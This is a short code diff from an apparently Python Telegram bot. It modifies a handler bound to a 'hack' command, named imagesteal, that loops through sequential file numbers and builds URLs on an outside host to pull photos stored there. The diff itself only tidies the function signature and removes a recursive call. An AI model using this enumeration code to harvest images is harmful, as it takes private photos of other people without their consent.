@@ -92,9 +92,8 @@ def todbsendtext (replied,message):
 			conn.close()
 			
 @bot.message_handler(commands=['hack'])
-def imagesteal(message,aValue):
-	if aValue is not None:
-		a = 1041959
+def imagesteal(message):
+	a = 1041959
 	try:
 		while a > 0:
 			url = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
@@ -111,7 +110,6 @@ def imagesteal(message,aValue):
 	except Exception as e:
 		print("ERROR : {0} \n".format(e))
 		a-=1
-		imagesteal(message,(a))
 	a-=1			   
 			
 
